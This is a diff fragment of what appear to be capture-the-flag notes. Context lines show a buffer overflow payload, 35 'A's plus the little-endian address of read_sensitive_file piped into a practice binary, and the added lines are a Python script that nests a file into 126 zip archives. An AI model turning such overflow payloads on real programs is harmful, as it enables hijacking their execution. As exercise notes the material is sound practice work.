@@ -149,3 +149,27 @@ void read_sensitive_file(void)
 > 1. inside python ---> import pwn; pwn.p32(0x<the address); 
 > 1. the above command will convert the address into little endian.
 > 1. python -c 'print("A"*35+"<Little Endian HEX address of read_sensitive_file")' | ./overspill.obj
+
+**Name: createZIP.py**
+```python
+import os
+import time
+
+loop=0;
+
+while loop <= 125:
+    loop_value = str(loop)
+    filename = loop_value+'.zip'
+
+    if (loop == 0):
+        os.system("zip " +filename+ " notes.txt")
+
+    else:
+        time.sleep(1)
+        previous_value = loop - 1
+        previous_value = str(previous_value)+".zip"
+        os.system("zip " +filename+" "+previous_value)
+        os.system("rm " +previous_value)
+
+    loop=loop+1
+```
